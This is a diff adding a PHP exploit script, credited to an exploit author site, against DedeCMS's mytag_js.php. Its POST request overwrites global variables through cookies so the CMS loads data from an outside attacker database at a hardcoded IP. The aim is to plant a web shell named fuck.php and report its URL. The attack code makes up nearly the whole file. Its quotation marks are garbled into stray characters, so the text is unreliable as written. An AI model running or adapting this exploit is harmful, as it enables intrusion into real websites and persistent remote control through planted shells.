@@ -1,0 +1,117 @@
+#!usr/bin/php -w
+
+<?php
+
+error_reporting(E_ERROR);
+
+set_time_limit(0);
+
+print_r(¡®
+
+DEDEcms Variable Coverage
+
+Exploit Author: [url]www.heixiaozi.com[/url]
+
+);
+
+echo ¡°\r\n";
+
+if($argv[2]==null){
+
+print_r(¡®
+
++¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª+
+
+Usage: php ¡®.$argv[0].¡¯ url aid path
+
+aid=1 shellpath /data/cache aid=2 shellpath= / aid=3 shellpath=/plus/
+
+Example:
+
+php ¡®.$argv[0].¡¯ [url]www.site.com[/url] 1 old
+
++¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª+
+
+¡®);
+
+exit;
+
+}
+
+$url=$argv[1];
+
+$aid=$argv[2];
+
+$path=$argv[3];
+
+$exp=Getshell($url,$aid,$path);
+
+if (strpos($exp,"OK")>12){
+
+echo ¡°[*] Exploit Success \n";
+
+if($aid==1)echo ¡°[*] Shell:".$url."/$path/data/cache/fuck.php\n" ;
+
+if($aid==2)echo ¡°[*] Shell:".$url."/$path/fuck.php\n" ;
+
+if($aid==3)echo ¡°[*] Shell:".$url."/$path/plus/fuck.php\n";
+
+}else{
+
+echo ¡°[*] Exploit Failed \n";
+
+}
+
+function Getshell($url,$aid,$path){
+
+$id=$aid;
+
+$host=$url;
+
+$port="80¡å;
+
+$content ="doaction=http%3A%2F%2F$host%2Fplus%2Fmytag_js.php%3Faid%3D1&_COOKIE%5BGLOBALS%5D%5Bcfg_dbhost%5D=184.105.174.114&_COOKIE%5BGLOBALS%5D%5Bcfg_dbuser%5D=exploit&_COOKIE%5BGLOBALS%5D%5Bcfg_dbpwd%5D=90sec&_COOKIE%5BGLOBALS%5D%5Bcfg_dbname%5D=exploit&_COOKIE%5BGLOBALS%5D%5Bcfg_dbprefix%5D=dede_&nocache=true&QuickSearchBtn=%CC%E1%BD%BB";
+
+$data = ¡°POST /$path/plus/mytag_js.php?aid=".$id." HTTP/1.1\r\n";
+
+$data .= ¡°Host: ¡°.$host."\r\n";
+
+$data .= ¡°User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\r\n";
+
+$data .= ¡°Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
+
+$data .= ¡°Accept-Language: zh-cn,zh;q=0.5\r\n";
+
+//$data .= ¡°Accept-Encoding: gzip,deflate\r\n";
+
+$data .= ¡°Accept-Charset: GB2312,utf-8;q=0.7,*;q=0.7\r\n";
+
+$data .= ¡°Connection: keep-alive\r\n";
+
+$data .= ¡°Content-Type: application/x-www-form-urlencoded\r\n";
+
+$data .= ¡°Content-Length: ¡°.strlen($content)."\r\n\r\n";
+
+$data .= $content."\r\n";
+
+$ock=fsockopen($host,$port);
+
+if (!$ock) {
+
+echo ¡°[*]  No response from ¡°.$host."\n";
+
+}
+
+fwrite($ock,$data);
+
+while (!feof($ock)) {
+
+$exp=fgets($ock, 1024);
+
+return $exp;
+
+}
+
+}
+
+?>
